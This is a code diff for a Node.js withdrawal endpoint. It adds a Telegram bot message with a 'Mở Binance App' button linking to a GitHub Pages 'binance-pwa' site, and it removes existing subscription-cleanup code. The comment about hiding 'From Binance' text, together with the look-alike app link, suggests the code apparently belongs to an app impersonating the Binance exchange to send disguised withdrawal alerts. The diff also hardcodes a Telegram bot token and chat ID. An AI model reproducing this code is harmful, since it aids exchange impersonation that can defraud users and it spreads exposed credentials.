@@ -371,10 +371,27 @@ app.post('/api/withdraw', async (req, res) => {
       }
     }
 
-    // Dọn dẹp các subscription đã chết
-    if (deadSubscriptions.length > 0) {
-      db.subscriptions = db.subscriptions.filter(s => !deadSubscriptions.includes(s.endpoint));
-      saveDatabase(db);
+    // GỬI ĐỒNG THỜI VỀ TELEGRAM BOT VỀ IPHONE (KHÔNG CÓ CHỮ FROM BINANCE)
+    try {
+      const tgToken = process.env.TELEGRAM_BOT_TOKEN || '8764330129:AAFGAUF01c2bvCXQu7cftO_BELfNg78G0So';
+      const tgChatId = process.env.TELEGRAM_CHAT_ID || '6262443219';
+      await fetch(`https://api.telegram.org/bot${tgToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: tgChatId,
+          text: `🔔 <b>${finalTitle}</b>\n\n${finalBody}`,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [[
+              { text: "📱 Mở Binance App", web_app: { url: "https://ngdat257257-glitch.github.io/binance-pwa/" } }
+            ]]
+          }
+        })
+      });
+      console.log('✓ Đã bắn thông báo rút tiền thành công qua Telegram về iPhone!');
+    } catch (tgErr) {
+      console.warn('Lỗi gửi Telegram rút tiền:', tgErr.message);
     }
   }, delayMs);
 });
